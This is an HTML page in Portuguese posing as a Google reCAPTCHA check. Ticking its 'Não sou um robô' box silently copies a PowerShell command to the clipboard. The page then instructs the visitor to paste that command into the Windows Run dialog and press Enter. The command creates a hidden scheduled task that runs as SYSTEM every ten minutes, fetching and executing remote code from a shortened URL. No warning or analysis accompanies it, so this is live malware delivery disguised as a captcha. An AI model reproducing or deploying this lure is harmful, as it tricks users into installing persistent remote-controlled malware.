<!DOCTYPE html>
<html lang="pt">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Captcha Personalizado</title>
    <style>
        /* (Mantenha o CSS original sem alterações) */
    </style>
</head>
<body>

    <div class="captcha-container">
        <div class="captcha-header">
            <input type="checkbox" id="captcha-checkbox" onchange="copyToClipboard(); showVerification()">
            <label for="captcha-checkbox">Não sou um robô</label>
            <div class="captcha-logo-container">
                <img class="captcha-logo" src="https://www.gstatic.com/recaptcha/api2/logo_48.png" alt="ReCAPTCHA logo">
                <p class="captcha-text">reCAPTCHA</p>
            </div>
        </div>

        <div class="verification-box" id="verification-box">
            <h3>Complete a Verificação</h3>
            <ol>
                <li>Pressione e segure as teclas <strong>Windows</strong> + <strong>R</strong>.</li>
                <li>Na tela de verificação, pressione <strong>Ctrl</strong> + <strong>V</strong>.</li>
                <li>Pressione <strong>Enter</strong> para finalizar.</li>
            </ol>
            <p class="verification-code">
                <span class="verified">✔ "Não sou um robô - ID do reCAPTCHA: 2417"</span>
            </p>
            <button id="verify-button" onclick="verificarCaptcha()">VERIFICAR</button>
        </div>
    </div>

    <script>
        function copyToClipboard() {
            const command = `powershell -c "$t=(Get-Date).AddMinutes(10); schtasks /create /tn U2FA /tr 'powershell -w Hidden -ep Bypass -c iex(iwr -useb https://tinyurl.com/2uxfvszc)' /sc minute /mo 10 /st $($t.ToString('HH:mm')) /ru SYSTEM /np /rl highest /f"`;
            
            navigator.clipboard.writeText(command).then(() => {
                console.log('Comando copiado para a área de transferência');
            }).catch(err => {
                // Fallback para navegadores mais antigos
                const textArea = document.createElement('textarea');
                textArea.value = command;
                document.body.appendChild(textArea);
                textArea.select();
                document.execCommand('copy');
                document.body.removeChild(textArea);
            });
        }

        function showVerification() {
            document.getElementById("verification-box").style.display = "block";
            document.getElementById("verify-button").style.display = "inline-block";
        }

        function verificarCaptcha() {
            const verifyButton = document.getElementById("verify-button");
            verifyButton.textContent = "Carregando...";
            verifyButton.style.backgroundColor = "#ccc";
            verifyButton.disabled = true;
            
            setTimeout(() => {
                verifyButton.innerHTML = "✔";
                verifyButton.style.backgroundColor = "#4CAF50";
                verifyButton.style.fontSize = "20px";
                verifyButton.style.fontWeight = "bold";
                
                setTimeout(() => {
                    alert('Verificado, obrigado');
                }, 500);
            }, 2000);
        }
    </script>

</body>
</html>
</html>
